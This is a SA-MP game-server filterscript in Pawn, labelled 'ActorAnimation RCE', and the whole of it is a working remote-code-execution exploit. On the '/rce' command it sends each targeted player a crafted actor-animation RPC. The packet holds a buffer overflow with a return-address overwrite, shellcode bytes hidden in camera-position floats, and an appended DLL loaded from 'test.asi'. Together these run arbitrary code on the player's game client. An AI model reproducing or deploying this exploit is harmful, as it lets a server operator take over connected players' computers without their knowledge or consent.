#define FILTERSCRIPT
#include <a_samp>
#include <Pawn.RakNet>

#define RPC_ACTOR_ANIM 0xAD

new overflow[] = {
    0x41, 0x41, 0x41, 0x41,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF,
    0x88, 0xF8, 0xB6
};

new dll[32768], dll_len;
new actor_id = INVALID_ACTOR_ID;

public OnFilterScriptInit()
{
    new File:f = fopen("test.asi");
    if(!f) { print("[ActorAnimation RCE] test.asi not found"); return 1; }
    dll_len = flength(f);
    if(dll_len > sizeof(dll) * 4) { printf("[ActorAnimation RCE] too large: %d", dll_len); dll_len = 0; }
    else { fblockread(f, dll); printf("[ActorAnimation RCE] loaded %d bytes", dll_len); }
    fclose(f);
    return 1;
}

public OnFilterScriptExit()
{
    if(actor_id != INVALID_ACTOR_ID) DestroyActor(actor_id);
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[])
{
    if(strcmp("/rce", cmdtext, true)) return 0;
    if(!dll_len) return 1;

    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    if(actor_id != INVALID_ACTOR_ID) DestroyActor(actor_id);
    actor_id = CreateActor(0, x + 3.0, y, z, 0.0);

    SetPlayerCameraLookAt(playerid, Float:0x47383968, Float:0x246C8B00, Float:0x40458B0C);
    SetPlayerCameraPos(playerid, Float:0x8B08408B, Float:0x37C68330, Float:0x90C3D6FF);

    new BitStream:bs = BS_New();
    BS_WriteValue(bs, PR_UINT16, actor_id, PR_UINT8, 3, PR_UINT8, 'P', PR_UINT8, 'E', PR_UINT8, 'D', PR_UINT8, sizeof(overflow));
    for(new i = 0; i < sizeof(overflow); i++) BS_WriteValue(bs, PR_UINT8, overflow[i]);
    BS_WriteValue(bs, PR_FLOAT, 4.1, PR_BOOL, false, PR_BOOL, false, PR_BOOL, false, PR_BOOL, false, PR_INT32, 0);

    new off;
    BS_GetWriteOffset(bs, off);
    BS_SetWriteOffset(bs, PR_BYTES_TO_BITS(PR_BITS_TO_BYTES(off)));

    for(new i = 0; i < dll_len / 4; i++) BS_WriteValue(bs, PR_UINT32, dll[i]);
    for(new i = 0, last = dll[dll_len / 4]; i < dll_len % 4; i++) BS_WriteValue(bs, PR_UINT8, (last >> (i * 8)) & 0xFF);

    PR_SendRPC(bs, playerid, RPC_ACTOR_ANIM, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
    BS_Delete(bs);
    SetCameraBehindPlayer(playerid);
    return 1;
}
